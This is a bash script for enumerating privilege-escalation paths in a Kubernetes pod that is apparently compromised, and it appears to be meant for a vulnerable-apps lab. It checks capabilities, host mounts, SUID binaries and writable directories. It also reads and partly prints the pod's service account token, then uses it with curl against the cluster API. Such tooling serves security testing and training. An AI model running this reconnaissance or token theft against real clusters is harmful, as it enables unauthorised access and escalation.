#!/bin/bash

# Script to attempt privilege escalation in a compromised container
# Checks for various privilege escalation vectors

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
POD_NAME="${2:-}"

if [ -z "$POD_NAME" ]; then
    echo -e "${YELLOW}Usage: $0 <namespace> <pod-name>${NC}"
    exit 1
fi

echo -e "${BLUE}=== Privilege Escalation Attempt ===${NC}"
echo -e "${GREEN}Pod: $POD_NAME${NC}"
echo -e "${GREEN}Namespace: $NAMESPACE${NC}\n"

# Check current privileges
echo -e "${YELLOW}[1] Checking current privileges...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'User ID:' && id && \
    echo '' && \
    echo 'Capabilities:' && \
    (capsh --print 2>/dev/null || echo 'capsh not available') && \
    echo '' && \
    echo 'Security Context:' && \
    cat /proc/self/status | grep -E '^Uid|^Gid|^Cap' | head -5
"

# Check if running as root
echo -e "\n${YELLOW}[2] Checking if running as root...${NC}"
IS_ROOT=$(kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "id -u" 2>/dev/null || echo "unknown")
if [ "$IS_ROOT" = "0" ]; then
    echo -e "${GREEN}✓ Already running as root!${NC}"
else
    echo -e "${YELLOW}Running as UID: $IS_ROOT${NC}"
fi

# Check for privileged container
echo -e "\n${YELLOW}[3] Checking container privileges...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'Checking /proc/self/status for capabilities...' && \
    if grep -q CapEff.*0000003fffffffff /proc/self/status 2>/dev/null; then
        echo '⚠ Container has extensive capabilities'
    fi && \
    echo '' && \
    echo 'Checking if privileged:' && \
    if [ -c /dev/kmsg ] 2>/dev/null; then
        echo '⚠ /dev/kmsg accessible (possible privileged container)'
    fi && \
    if mount | grep -q ' / '; then
        echo 'Mount information:'
        mount | grep ' / ' | head -3
    fi
"

# Check for host filesystem access
echo -e "\n${YELLOW}[4] Checking for host filesystem access...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'Checking for host mounts...' && \
    mount | grep -E 'host|node' | head -5 || echo 'No obvious host mounts'
"

# Check for service account token
echo -e "\n${YELLOW}[5] Checking service account token...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo '✓ Service account token found' && \
        echo 'Token preview:' && \
        head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token && \
        echo '...' && \
        echo '' && \
        echo 'Service account name:' && \
        cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo 'unknown'
    else
        echo '✗ No service account token found'
    fi
"

# Attempt to access Kubernetes API
echo -e "\n${YELLOW}[6] Attempting Kubernetes API access...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    KUBE_TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    KUBE_CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    KUBE_NAMESPACE=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    
    if [ -n \"\$KUBE_TOKEN\" ]; then
        echo 'Attempting to access Kubernetes API...' && \
        curl -k -s -H \"Authorization: Bearer \$KUBE_TOKEN\" \
            --cacert \$KUBE_CA \
            https://kubernetes.default.svc/api/v1/namespaces/\$KUBE_NAMESPACE/pods 2>&1 | head -10 || \
        echo 'API access failed'
    else
        echo 'No token available'
    fi
"

# Check for writable directories
echo -e "\n${YELLOW}[7] Checking for writable directories...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'Writable directories:' && \
    find / -type d -writable 2>/dev/null | grep -vE 'proc|sys|dev' | head -10 || \
    echo 'No writable directories found (or find failed)'
"

# Check for SUID binaries
echo -e "\n${YELLOW}[8] Checking for SUID binaries...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'SUID binaries:' && \
    find / -perm -4000 -type f 2>/dev/null | head -10 || \
    echo 'No SUID binaries found (or find failed)'
"

echo -e "\n${GREEN}=== Privilege Escalation Check Complete ===${NC}"

